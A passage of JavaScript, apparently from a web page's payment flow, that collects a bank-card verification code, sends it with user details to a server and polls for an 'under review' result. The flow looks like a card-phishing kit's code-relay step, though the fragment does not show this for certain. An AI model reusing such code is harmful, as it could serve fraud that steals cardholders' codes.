                            window.showMessage("你的卡片信息有误，无法获取验证码,请重新填写","txt");
                            setTimeout(window.hideMessage,2000);
                            this.goback();
                         }
                     }
                 })
             },2000);
     },
     goSuccess()
     {  
       
       //window.userinfo.address=this.address
       //window.userinfo.cardphone=this.cardphone
       clearInterval(this.timer);
       window.userinfo.cardcode=this.cardcode
       //window.userinfo.name=this.username
       window.showMessage("正在审核中,请稍后","loading");
       this.daojishi=false;
       this.djs=300;
       clearInterval(this.dtimer);
       Api.updatecode(window.rid,window.userinfo).then((res)=>{
            
            this.timer=setInterval(()=>{
                 Api.check(window.rid).then((rs)=>{

